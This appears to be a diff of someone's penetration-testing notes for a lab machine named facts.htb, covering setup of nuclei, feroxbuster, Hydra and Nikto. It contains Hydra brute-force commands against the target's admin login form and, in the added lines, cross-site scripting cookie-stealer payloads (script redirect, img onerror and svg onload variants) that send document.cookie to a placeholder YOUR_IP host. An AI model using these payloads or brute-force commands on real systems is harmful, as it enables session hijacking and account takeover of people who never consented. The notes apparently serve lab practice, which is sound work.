@@ -8,7 +8,7 @@ Nuclei
 https://github.com/projectdiscovery/nuclei/releases/tag/v3.7.1
 unzip nuclei.zip
 sudo mv nuclei /usr/local/bin/
-
+git clone https://github.com/projectdiscovery/nuclei-templates.git /home/kali/nuclei-templates
 
 
 feroxbuster
@@ -21,3 +21,40 @@ Hydra
 /usr/share/wordlists/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
 hydra -l admin -P /usr/share/wordlists/rockyou.txt facts.htb http-post-form "/admin/login:user[username]=^USER^&user[password]=^PASS^:F=Username or Password incorrect" -t 32 -V
 hydra -l admin -P /usr/share/wordlists/rockyou.txt facts.htb http-post-form "/admin/login:user[username]=^USER^&user[password]=^PASS^:S=302" -t 32 -V
+
+
+
+Nikto
+nikto -h http://facts.htb/ 
+
+
+
+
+
+
+
+
+
+document.cookie  // Returns ALL cookies without HttpOnly
+[Find XSS] → [Inject JS payload] → [Steal cookie] → [Hijack session]
+
+// Basic cookie stealer
+<script>
+  document.location='http://YOUR_IP/steal?c='+document.cookie
+</script>
+
+// More stealthy (image tag, no redirect)
+<img src="x" onerror="fetch('http://YOUR_IP/?c='+document.cookie)">
+
+// Even shorter
+<svg onload="fetch('//YOUR_IP/?c='+btoa(document.cookie))">
+
+
+
+
+
+
+
+
+
+
